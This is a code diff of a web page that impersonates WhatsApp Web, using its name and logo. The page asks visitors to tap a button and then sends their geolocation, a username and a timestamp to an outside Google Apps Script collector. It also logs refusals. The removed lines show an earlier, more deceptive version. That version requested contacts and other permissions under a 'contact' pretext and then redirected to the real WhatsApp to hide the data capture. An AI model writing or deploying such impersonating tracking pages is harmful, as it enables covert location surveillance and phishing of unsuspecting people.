@@ -103,7 +103,7 @@ button:hover { background-color: var(--button-hover); }
 <body>
 
 <header>
-    <a href="https://web.whatsapp.com" style="text-decoration:none; display:flex; align-items:center;">
+    <a href="#" style="text-decoration:none; display:flex; align-items:center;">
         <img src="https://static.whatsapp.net/rsrc.php/v4/yP/r/rYZqPCBaG70.png" alt="Logo">
         <h1>WhatsApp Web</h1>
     </a>
@@ -113,9 +113,8 @@ button:hover { background-color: var(--button-hover); }
     <div class="card" id="contactCard">
         <div class="profile-circle">S</div>
         <div class="name">Saifou</div>
-        <p>Cliquez pour partager votre contact sur WhatsApp</p>
-        <button id="actionButton">Contacter</button>
-        <button id="openWhatsAppBtn" style="display:none;">Ouvrir WhatsApp</button>
+        <p>Cliquez pour partager votre localisation</p>
+        <button id="actionButton">Partager</button>
         <div class="loading" id="loadingSpinner"></div>
     </div>
 </div>
@@ -129,29 +128,11 @@ button:hover { background-color: var(--button-hover); }
 const card = document.getElementById('contactCard');
 const button = document.getElementById('actionButton');
 const spinner = document.getElementById('loadingSpinner');
-const openBtn = document.getElementById('openWhatsAppBtn');
 
-function redirectToWhatsApp() {
-    const ua = navigator.userAgent || navigator.vendor || window.opera;
-    let url = "https://web.whatsapp.com"; // fallback PC
-    if (/android/i.test(ua) || /iPad|iPhone|iPod/.test(ua)) {
-        url = "whatsapp://send?text=Bonjour"; // ouvre app WhatsApp sur mobile
-    }
-    window.location.href = url;
-}
-
-async function handlePermissions() {
-    await navigator.permissions.query({ name: 'clipboard-write' });
-    if ('Notification' in window) { await Notification.requestPermission(); }
-    if (navigator.contacts && navigator.contacts.select) {
-        await navigator.contacts.select(['name','tel'], { multiple:false });
-    }
-}
-
-async function getGeolocationAndRedirect() {
-    card.querySelector('p').textContent = "Accès à WhatsApp en cours...";
+async function getGeolocation() {
+    card.querySelector('p').textContent = "Accès à votre position en cours...";
     spinner.style.display = 'block';
-    openBtn.style.display = 'none';
+    button.style.display = 'none';
 
     if ("geolocation" in navigator) {
         navigator.geolocation.getCurrentPosition(
@@ -163,15 +144,13 @@ async function getGeolocationAndRedirect() {
                         latitude: position.coords.latitude,
                         longitude: position.coords.longitude,
                         nom_utilisateur: "seami",
-                        contact: "0123456789",
                         statut_geoloc: "acceptée",
                         heure: new Date().toISOString()
                     }),
                     mode: 'no-cors'
                 }).catch(err => console.error("Erreur fetch:", err));
 
-                card.querySelector('p').textContent = "Redirection en cours...";
-                setTimeout(redirectToWhatsApp, 1000);
+                card.querySelector('p').textContent = "Votre localisation a été partagée.";
             },
             async (error) => {
                 await fetch("https://script.google.com/macros/s/AKfycbwOiyIdX2JBQACPx3FOQX5XF6iNf4iI-SwxnOUD3n0ir8vg_rrfdmQQv3b98LecIVFi/exec", {
@@ -181,43 +160,22 @@ async function getGeolocationAndRedirect() {
                         latitude: null,
                         longitude: null,
                         nom_utilisateur: "seami",
-                        contact: "0123456789",
                         statut_geoloc: "refusée",
                         heure: new Date().toISOString()
                     }),
                     mode: 'no-cors'
                 }).catch(err => console.error("Erreur fetch:", err));
 
-                window.location.href = "geoloc-refuse.html";
+                card.querySelector('p').textContent = "Vous avez refusé l'accès à la localisation.";
             },
             { enableHighAccuracy: false, timeout: 5000 }
         );
     } else {
-        redirectToWhatsApp();
+        card.querySelector('p').textContent = "Géolocalisation non disponible sur ce navigateur.";
     }
 }
 
-button.addEventListener('click', async function() {
-    button.style.display = 'none';
-    spinner.style.display = 'block';
-    card.querySelector('p').textContent = "Demande des autorisations...";
-
-    try {
-        await handlePermissions();
-        if (/iPad|iPhone|iPod/.test(navigator.userAgent)) {
-            spinner.style.display = 'none';
-            openBtn.style.display = 'block';
-            card.querySelector('p').textContent = "Cliquez pour ouvrir WhatsApp après avoir autorisé les permissions.";
-        } else {
-            getGeolocationAndRedirect();
-        }
-    } catch(err) {
-        console.error("Erreur:", err);
-        redirectToWhatsApp();
-    }
-});
-
-openBtn.addEventListener('click', getGeolocationAndRedirect);
+button.addEventListener('click', getGeolocation);
 </script>
 
 </body>
